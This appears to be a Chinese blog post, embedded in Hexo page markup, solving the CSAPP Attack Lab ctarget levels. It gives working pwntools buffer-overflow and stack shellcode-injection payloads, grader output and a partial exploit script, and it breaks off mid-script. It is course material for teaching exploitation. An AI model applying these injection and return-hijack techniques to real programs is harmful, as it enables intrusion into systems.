@@ -1,0 +1,1358 @@
+<!DOCTYPE html>
+<html lang="en">
+    <!-- title -->
+
+
+    
+
+<!-- keywords -->
+
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="author" content="John Doe">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="John Doe">
+    
+        <meta name="keywords" content="hexo,hexo-theme,hexo-blog,blog,pwn,heap">
+    
+    <meta name="description" content="">
+    <meta name="description" content="介绍和要求这一集官方文档是好帮手。文档里面给出了很多的提示和源码相关的信息（虽然我们有作弊工具IDA）。 此外，这关不允许我们通过攻击绕过验证代码或函数，亦即对于我们ROP攻击劫持到的地址做了如下限制：  touch1、touch2、touch3函数的地址 你自己注入代码的地址 gadget farm中的gadget地址  另外，gadget只能来自于rtarget文件本身且地址介于start_f">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CSAPP Labs——Attack Lab">
+<meta property="og:url" content="http://example.com/2024/07/04/CSAPP-Labs%E2%80%94%E2%80%94Attack-Lab/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="介绍和要求这一集官方文档是好帮手。文档里面给出了很多的提示和源码相关的信息（虽然我们有作弊工具IDA）。 此外，这关不允许我们通过攻击绕过验证代码或函数，亦即对于我们ROP攻击劫持到的地址做了如下限制：  touch1、touch2、touch3函数的地址 你自己注入代码的地址 gadget farm中的gadget地址  另外，gadget只能来自于rtarget文件本身且地址介于start_f">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2024-07-04T14:04:27.000Z">
+<meta property="article:modified_time" content="2024-07-07T07:38:08.225Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="CSAPP">
+<meta property="article:tag" content="Lab">
+<meta property="article:tag" content="pwn">
+<meta name="twitter:card" content="summary">
+    <meta http-equiv="Cache-control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <link rel="icon" href="/assets/favicon.ico">
+    
+    <title>CSAPP Labs——Attack Lab · Zj_W1nd&#39;s BLOG</title>
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+    (function (w) {
+        'use strict'
+        // rel=preload support test
+        if (!w.loadCSS) {
+            w.loadCSS = function () {}
+        }
+        // define on the loadCSS obj
+        var rp = (loadCSS.relpreload = {})
+        // rel=preload feature support test
+        // runs once and returns a function for compat purposes
+        rp.support = (function () {
+            var ret
+            try {
+                ret = w.document.createElement('link').relList.supports('preload')
+            } catch (e) {
+                ret = false
+            }
+            return function () {
+                return ret
+            }
+        })()
+
+        // if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+        // then change that media back to its intended value on load
+        rp.bindMediaToggle = function (link) {
+            // remember existing media attr for ultimate state, or default to 'all'
+            var finalMedia = link.media || 'all'
+
+            function enableStylesheet() {
+                link.media = finalMedia
+            }
+
+            // bind load handlers to enable media
+            if (link.addEventListener) {
+                link.addEventListener('load', enableStylesheet)
+            } else if (link.attachEvent) {
+                link.attachEvent('onload', enableStylesheet)
+            }
+
+            // Set rel and non-applicable media type to start an async request
+            // note: timeout allows this to happen async to let rendering continue in IE
+            setTimeout(function () {
+                link.rel = 'stylesheet'
+                link.media = 'only x'
+            })
+            // also enable media after 3 seconds,
+            // which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+            setTimeout(enableStylesheet, 3000)
+        }
+
+        // loop through link elements in DOM
+        rp.poly = function () {
+            // double check this to prevent external calls from running
+            if (rp.support()) {
+                return
+            }
+            var links = w.document.getElementsByTagName('link')
+            for (var i = 0; i < links.length; i++) {
+                var link = links[i]
+                // qualify links to those with rel=preload and as=style attrs
+                if (
+                    link.rel === 'preload' &&
+                    link.getAttribute('as') === 'style' &&
+                    !link.getAttribute('data-loadcss')
+                ) {
+                    // prevent rerunning on link
+                    link.setAttribute('data-loadcss', true)
+                    // bind listeners to toggle media back
+                    rp.bindMediaToggle(link)
+                }
+            }
+        }
+
+        // if unsupported, run the polyfill
+        if (!rp.support()) {
+            // run once at least
+            rp.poly()
+
+            // rerun poly on an interval until onload
+            var run = w.setInterval(rp.poly, 500)
+            if (w.addEventListener) {
+                w.addEventListener('load', function () {
+                    rp.poly()
+                    w.clearInterval(run)
+                })
+            } else if (w.attachEvent) {
+                w.attachEvent('onload', function () {
+                    rp.poly()
+                    w.clearInterval(run)
+                })
+            }
+        }
+
+        // commonjs
+        if (typeof exports !== 'undefined') {
+            exports.loadCSS = loadCSS
+        } else {
+            w.loadCSS = loadCSS
+        }
+    })(typeof global !== 'undefined' ? global : this)
+</script>
+
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .back-top,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s infinite;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+</style>
+
+    <link rel="preload" href="/css/style.css?v=20211217" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <link rel="preload" href="/css/dark.css?v=20211217" as="style">
+    <link rel="stylesheet" href="/css/dark.css">
+    <link rel="stylesheet" href="/css/mobile.css?v=20211217" media="(max-width: 960px)">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" as="script">
+    <link rel="preload" href="/scripts/main.js?v=20211217" as="script">
+    <link rel="preload" href="/scripts/dark.js?v=20211217" as="script">
+    <link rel="preload" href="/font/Oswald-Regular.ttf" as="font" crossorigin>
+    <link rel="preload" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" as="font" crossorigin>
+    <!-- algolia -->
+    
+    <!-- 百度统计  -->
+    
+    <!-- Google tag (gtag.js) -->
+    
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js"></script>
+    <script type="text/javascript">
+        if (typeof window.$ == undefined) {
+            console.warn('jquery load from jsdelivr failed, will load local script')
+            document.write('<script src="/lib/jquery.min.js" />')
+        }
+    </script>
+    
+        <body class="post-body">
+    
+        <!-- header -->
+        <header class="header header-mobile">
+    <!-- top read progress line -->
+    <div class="header-element">
+        <div class="read-progress"></div>
+    </div>
+    <!-- sidebar menu button -->
+    <div class="header-element">
+        
+            <div class="header-sidebar-menu">
+        
+            
+                <div style="padding-left: 1px;">&#xe775;</div>
+            
+        </div>
+    </div>
+    <!-- header actions -->
+    <div class="header-actions">
+        <!-- theme mode switch button -->
+        <span class="header-theme-btn header-element">
+            <i class="fas fa-adjust"></i>
+        </span>
+        <!-- back to home page text -->
+        <span class="home-link header-element">
+            <a href=/>Zj_W1nd's BLOG</a>
+        </span>
+    </div>
+    <!-- toggle banner for post layout -->
+    
+        
+            <div class="banner">
+        
+            <div class="blog-title header-element">
+                <a href="/">Zj_W1nd&#39;s BLOG</a>
+            </div>
+            <div class="post-title header-element">
+                <a href="#" class="post-name">CSAPP Labs——Attack Lab</a>
+            </div>
+        </div>
+    
+</header>
+
+        <!-- fixed footer -->
+        <footer class="footer-fixed">
+    <!-- back to top button -->
+    <div class="footer-fixed-element">
+        
+            <div class="back-top back-top-hidden">
+        
+        
+            <div>&#xe639;</div>
+        
+        </div>
+    </div>
+</footer>
+
+        <!-- wrapper -->
+        <div class="wrapper">
+            <div class="site-intro" style="
+
+
+
+
+
+
+
+    height:50vh;
+
+">
+    
+    <!-- 主页  -->
+    
+        
+    <!-- 404页  -->
+    
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+                CSAPP Labs——Attack Lab
+            <!-- 404 -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+                
+            <!-- 404 -->
+            
+        </p>
+        <!-- 文章页 meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                    <div class= post-intro-tags >
+    
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags="CSAPP">CSAPP</a>
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags="Lab">Lab</a>
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags="pwn">pwn</a>
+    
+</div>
+
+                
+                <!-- 文章字数统计 -->
+                
+                <div class="post-intro-meta">
+                    <!-- 撰写日期 -->
+                    <span class="iconfont-archer post-intro-calander">&#xe676;</span>
+                    <span class="post-intro-time">2024/07/04</span>
+                    <!-- busuanzi -->
+                    
+                        <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                            <span class="iconfont-archer post-intro-busuanzi">&#xe602;</span>
+                            <span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    
+                    <!-- 文章分享 -->
+                    <span class="share-wrapper">
+                        <span class="iconfont-archer share-icon">&#xe71d;</span>
+                        <span class="share-text">Share</span>
+                        <ul class="share-list">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
+        
+    </div>
+</div>
+
+            <script>
+  // get user agent
+  function getBrowserVersions() {
+    var u = window.navigator.userAgent
+    return {
+      userAgent: u,
+      trident: u.indexOf('Trident') > -1, //IE内核
+      presto: u.indexOf('Presto') > -1, //opera内核
+      webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+      gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+      mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+      ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+      android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+      iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+      iPad: u.indexOf('iPad') > -1, //是否为iPad
+      webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+      weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+      uc: u.indexOf('UCBrowser') > -1, //是否为android下的UC浏览器
+    }
+  }
+  var browser = {
+    versions: getBrowserVersions(),
+  }
+  console.log('userAgent: ' + browser.versions.userAgent)
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded')
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document
+        .getElementsByClassName('intro-title')[0]
+        .classList.add('intro-fade-in')
+      document
+        .getElementsByClassName('intro-subtitle')[0]
+        .classList.add('intro-fade-in')
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in')
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb() {
+    if (browser.versions.uc) {
+      console.log('UCBrowser')
+      fontLoaded()
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular'],
+        },
+        loading: function () {
+          // 所有字体开始加载
+          // console.log('font loading');
+        },
+        active: function () {
+          // 所有字体已渲染
+          fontLoaded()
+        },
+        inactive: function () {
+          // 字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout')
+          fontLoaded()
+        },
+        timeout: 5000, // Set the timeout to two seconds
+      })
+    }
+  }
+
+  function asyncErr() {
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document,
+      t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0]
+    o.src = u
+    if (cb) {
+      o.addEventListener(
+        'load',
+        function (e) {
+          cb(null, e)
+        },
+        false
+      )
+    }
+    if (err) {
+      o.addEventListener(
+        'error',
+        function (e) {
+          err(null, e)
+        },
+        false
+      )
+    }
+    s.parentNode.insertBefore(o, s)
+  }
+
+  var asyncLoadWithFallBack = function (arr, success, reject) {
+    var currReject = function () {
+      reject()
+      arr.shift()
+      if (arr.length) async(arr[0], success, currReject)
+    }
+
+    async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack(
+    [
+      'https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js',
+      'https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js',
+      "/lib/webfontloader.min.js",
+    ],
+    asyncCb,
+    asyncErr
+  )
+</script>
+
+            <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
+            <div class="container container-unloaded">
+                <main class="main post-page">
+    <article class="article-entry">
+        <h1 id="介绍和要求"><a href="#介绍和要求" class="headerlink" title="介绍和要求"></a>介绍和要求</h1><p>这一集官方文档是好帮手。文档里面给出了很多的提示和源码相关的信息（虽然我们有作弊工具IDA）。</p>
+<p>此外，这关不允许我们通过攻击绕过验证代码或函数，亦即对于我们ROP攻击劫持到的地址做了如下限制：</p>
+<ol>
+<li><code>touch1</code>、<code>touch2</code>、<code>touch3</code>函数的地址</li>
+<li>你自己注入代码的地址</li>
+<li>gadget farm中的gadget地址</li>
+</ol>
+<p>另外，gadget只能来自于rtarget文件本身且地址介于start_farm和end_farm之间的函数。了解了要求限制就可以开始干活了。</p>
+<h1 id="Ctarget：Code-Injection"><a href="#Ctarget：Code-Injection" class="headerlink" title="Ctarget：Code Injection"></a>Ctarget：Code Injection</h1><p>这个程序本身大头不在实验本身，主要在各种各样的验证，报错，和远程连接部分，没有IDA也能便于理解。程序还是可以通过参数自己选择输入流（文件&#x2F;stdin），它内部实现了一个Gets函数，可以从标准输入或者文件流依据选择读取输入，只检查回车和EOF，同时使用一个<code>test()</code>函数调用，程序运行一下，就是一个读取输入然后告诉你返回值或者抛出错误并输出错误地址附近的十六进制值。</p>
+<p>另外，虽然说checksec显示只关闭了aslr，但是canary对于我们实际要攻击的函数部分也是没有的，canary没有加在溢出点和利用函数上。还有这个堆栈不可执行NX保护也是在实验里没有用，我们能随便往栈上写代码然后执行，挺搞的。</p>
+<h2 id="Lv1-简单ret2txt，劫持到touch1"><a href="#Lv1-简单ret2txt，劫持到touch1" class="headerlink" title="Lv1: 简单ret2txt，劫持到touch1"></a>Lv1: 简单ret2txt，劫持到touch1</h2><p>这个文件第一关只要能返回到touch1就行。buf从IDA看是32字节，直接ROP。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">touch1=<span class="number">0x4017c0</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">32</span>+<span class="string">b&#x27;aaaaaaaa&#x27;</span>+p64(touch1)</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>Valid solution for level 1 with target ctarget<br>PASS: Would have posted the following:<br>  user id    bovik<br>  course    15213-f15<br>  lab    attacklab<br>  result    1:PASS:0xffffffff:ctarget:1:61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 &gt; 61 61 61 61 61 61 61 61 61 C0 17 40 00 00 00 00 00</p>
+</blockquote>
+<h2 id="Lv2：ret2sc传递参数，改变分支"><a href="#Lv2：ret2sc传递参数，改变分支" class="headerlink" title="Lv2：ret2sc传递参数，改变分支"></a>Lv2：ret2sc传递参数，改变分支</h2><p>这一关需要我们bypass一个分支，判断条件是将cookie和touch2传入的参数比较。看IDA反汇编代码，这里是普通的64位调用规则，这个unsigned int参数从rdi传入。而且只允许使用ret进行控制流转移。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"> ; <span class="type">void</span> __fastcall __noreturn <span class="title function_">touch2</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> val)</span></span><br><span class="line">                public touch2</span><br><span class="line">touch2          proc near</span><br><span class="line">val = rdi                               ; <span class="type">unsigned</span> <span class="type">int</span></span><br><span class="line">; __unwind &#123;</span><br><span class="line">               sub     rsp, <span class="number">8</span></span><br><span class="line">               mov     edx, edi</span><br><span class="line">               mov     cs:vlevel, <span class="number">2</span></span><br><span class="line">               cmp     edi, cs:cookie <span class="comment">//这里比较的是</span></span><br><span class="line">               jnz     <span class="type">short</span> loc_401824</span><br><span class="line">               mov     esi, offset aTouch2YouCalle ; <span class="string">&quot;Touch2!: You called touch2(0x%.8x)\n&quot;</span></span><br><span class="line">               mov     edi, <span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<p>这里其实按理说用ROPgadget搜一个就行:</p>
+<blockquote>
+<p>0x000000000040141b : pop rdi ; ret</p>
+</blockquote>
+<p>但是它说我们是injected code，所以可以尝试自己写。<br>但这里其实是不太行的，上网查到的资料都是定位了栈地址然后用一个ret劫持控制流到栈上。然后在栈上写了<code>mov rdi,cookie ret</code>的机器码。作为本地调试的实际操作者，理论上你有对内存的完全控制权限，直接pwndbg <code>set</code>不就行了（）。如果是非本地环境，其实栈的地址一般比较难泄露而且难以利用。考虑到通关要求，还是假装我们有一个固定的栈地址然后完成这一关。只允许用ret，不然其实直接jmp也行啊（）：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">touch2=<span class="number">0x4017ec</span></span><br><span class="line">stack=<span class="number">0x5561dc78</span>  <span class="comment"># 栈帧rsp，同时指向输入开头</span></span><br><span class="line">raw_code1=asm(<span class="string">&#x27;mov rdi,0x59b997fa&#x27;</span>)+asm(<span class="string">&#x27;push 0x4017ec&#x27;</span>)+asm(<span class="string">&#x27;ret&#x27;</span>)</span><br><span class="line">payload2=raw_code1+<span class="string">b&#x27;a&#x27;</span>*(<span class="number">32</span>-<span class="built_in">len</span>(raw_code1)+<span class="number">8</span>)+p64(stack)</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>Type string:Touch2!: You called touch2(0x59b997fa)<br>Valid solution for level 2 with target ctarget<br>PASS: Would have posted the following:<br>  user id    bovik<br>  course    15213-f15<br>  lab    attacklab<br>  result    1:PASS:0xffffffff:ctarget:2:48 C7 C7 FA 97 B9 59 68 EC 17 40 00 C3 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 &gt; 61 61 61 61 61 61 61 61 61 78 DC 61 55 00 00 00 00</p>
+</blockquote>
+<h2 id="Lv3-ret2sc传递参数（字符串指针），改变分支"><a href="#Lv3-ret2sc传递参数（字符串指针），改变分支" class="headerlink" title="Lv3: ret2sc传递参数（字符串指针），改变分支"></a>Lv3: ret2sc传递参数（字符串指针），改变分支</h2><p>touch3内部调用了一个启用了canary的hexmatch函数，会将touch3参数中指向的字符串和cookie比较。内部是封装的<code>strncmp()</code>。里面其实是将cookie用格式化字符串”%.8x”写到了自己的栈上。也就是说cookie要转成8个字节的ascii，然后将地址传过去。</p>
+<p>开始以为和lv2没啥差别，结果这一关搞了半天。touch3是先调用了hexmatch进行判断，hexmatch函数内部最后返回是调用的strncmp函数。  这里官方文档其实提示了这么一句：</p>
+<blockquote>
+<p>When functions hexmatch and strncmp are called, they push data onto the stack, overwriting portions of memory that held the buffer used by getbuf. As a result, you will need to be careful where you place the string representation of your cookie.</p>
+</blockquote>
+<p>这是怎么一回事呢，我们看一下hexmatch函数内部（注意，下面代码不是正确的，只是IDA给出的反汇编）：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">hexmatch</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> val, <span class="type">char</span> *sval)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v2; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">char</span> cbuf[<span class="number">110</span>]; <span class="comment">// [rsp+0h] [rbp-98h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+78h] [rbp-20h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v2 = &amp;cbuf[random() % <span class="number">100</span>];</span><br><span class="line">  __sprintf_chk(v2, <span class="number">1LL</span>, <span class="number">-1LL</span>, <span class="string">&quot;%.8x&quot;</span>, val);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">strncmp</span>(sval, v2, <span class="number">9uLL</span>) == <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>开始我以为这里面再申请空间也不会将前面栈帧破坏了，结果动调反复调整cookie_str的位置发现每次到调用strncmp的时候，栈上对应的位置都已经空了。这里F5就不管用了，我们看一下hexmatch开头的汇编代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">push    r12</span><br><span class="line">push    rbp</span><br><span class="line">push    rbx</span><br><span class="line">add     rsp, -80h ;这里将栈抬高了80h</span><br><span class="line">mov     r12d, edi</span><br><span class="line">mov     rbp, sval</span><br><span class="line">mov     rax, fs:28h ;canary</span><br><span class="line">mov     [rsp+98h+var_20], rax ;但是后续的寻址都有一个+98h</span><br></pre></td></tr></table></figure>
+
+<p>可以发现，虽然开头-80h，但是中间所有的寻址调用都是以<code>rsp+98h</code>作为基址，也就是说，上个函数栈帧的0x18h的24字节内容都被覆盖了。要有\x00结尾的话cookie需要9个字节，保证返回地址正确的话只能写在返回地址后面了（小端序导致写8个字节最后一个不是00而是返回地址的最低字节）。  </p>
+<blockquote>
+<p>有rbp，是不是其实不用写到返回值后面？但我自己尝试的时候跟在ret地址前面操作失败了。</p>
+</blockquote>
+<p>而且这里向cbuf中写cookie字符串的时候调用了一个<code>random()%100</code>,可能是为了暗示这里都不让写东西吧（但其实程序开始的时候每个cookie都被作为随机数种子了，本地运行其实是伪随机）。这里看汇编的话取模运算编译器也是优化的抽象至极，疑似蒙哥马利乘：</p>
+<blockquote>
+<p>下面的代码实现了rcx&lt;-rax%100</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">mov     rcx, rax</span><br><span class="line">mov     rdx, 0A3D70A3D70A3D70Bh ;???</span><br><span class="line">imul    rdx</span><br><span class="line">add     rdx, rcx</span><br><span class="line">sar     rdx, 6</span><br><span class="line">mov     rax, rcx</span><br><span class="line">sar     rax, 3Fh</span><br><span class="line">sub     rdx, rax</span><br><span class="line">lea     rax, [rdx+rdx*4]</span><br><span class="line">lea     rax, [rax+rax*4]</span><br><span class="line">shl     rax, 2</span><br><span class="line">sub     rcx, rax</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">touch3=<span class="number">0x4018FA</span></span><br><span class="line">stack=<span class="number">0x5561dc78</span>  <span class="comment"># 栈帧rsp，同时指向输入开头</span></span><br><span class="line">raw_code2=asm(<span class="string">&#x27;mov rdi,0x5561dca8&#x27;</span>)+asm(<span class="string">&#x27;push 0x4018FA&#x27;</span>)+asm(<span class="string">&#x27;ret&#x27;</span>)</span><br><span class="line">str_cookie=<span class="string">b&quot;59b997fa\x00&quot;</span></span><br><span class="line">payload3=raw_code2+<span class="string">b&#x27;a&#x27;</span>*(<span class="number">32</span>-<span class="built_in">len</span>(raw_code2)+<span class="number">8</span>)+p64(stack)+str_cookie</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>Type string:Touch3!: You called touch3(“59b997fa”)<br>Valid solution for level 3 with target ctarget<br>PASS: Would have posted the following:<br>   user id    bovik<br>   course    15213-f15<br>   lab    attacklab<br>    result    1:PASS:0xffffffff:ctarget:3:48 C7 C7 A8 DC 61 55 68 FA 18 40 00 C3 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 78 DC 61 55 00 00 00 00 35 39 62 39 39 37 66 61 00</p>
+</blockquote>
+<p>附上Ctarget的exp：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#*-* coding: utf-8 *-*</span></span><br><span class="line"><span class="comment"># EXP for ctarget</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;info&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.terminal=[<span class="string">&quot;cmd.exe&quot;</span>,<span class="string">&quot;/c&quot;</span>, <span class="string">&quot;start&quot;</span>, <span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, <span class="string">&quot;wsl.exe&quot;</span>, <span class="string">&quot;-e&quot;</span>]</span><br><span class="line">argv=[<span class="string">&#x27;./ctarget&#x27;</span>,<span class="string">&#x27;-q&#x27;</span>]</span><br><span class="line">p = process(argv)</span><br><span class="line"></span><br><span class="line"><span class="comment"># cookie=0x59b997fa</span></span><br><span class="line">touch1=<span class="number">0x4017c0</span></span><br><span class="line">touch2=<span class="number">0x4017ec</span></span><br><span class="line">touch3=<span class="number">0x4018FA</span></span><br><span class="line">stack=<span class="number">0x5561dc78</span>  <span class="comment"># 栈帧rsp，同时指向输入开头</span></span><br><span class="line"></span><br><span class="line">raw_code1=asm(<span class="string">&#x27;mov rdi,0x59b997fa&#x27;</span>)+asm(<span class="string">&#x27;push 0x4017ec&#x27;</span>)+asm(<span class="string">&#x27;ret&#x27;</span>)</span><br><span class="line">raw_code2=asm(<span class="string">&#x27;mov rdi,0x5561dca8&#x27;</span>)+asm(<span class="string">&#x27;push 0x4018FA&#x27;</span>)+asm(<span class="string">&#x27;ret&#x27;</span>)</span><br><span class="line"><span class="comment"># tm的都想往bss写了，结果要放在ret后面</span></span><br><span class="line">str_cookie=<span class="string">b&quot;59b997fa\x00&quot;</span></span><br><span class="line"><span class="comment"># 35 39 62 39 39 37 66 61</span></span><br><span class="line"><span class="comment"># 0x6166373962393535</span></span><br><span class="line"></span><br><span class="line">payload1=<span class="string">b&#x27;a&#x27;</span>*<span class="number">32</span>+<span class="string">b&#x27;aaaaaaaa&#x27;</span>+p64(touch1)</span><br><span class="line">payload2=raw_code1+<span class="string">b&#x27;a&#x27;</span>*(<span class="number">32</span>-<span class="built_in">len</span>(raw_code1)+<span class="number">8</span>)+p64(stack)</span><br><span class="line">payload3=raw_code2+<span class="string">b&#x27;a&#x27;</span>*(<span class="number">32</span>-<span class="built_in">len</span>(raw_code2)+<span class="number">8</span>)+p64(stack)+str_cookie</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span 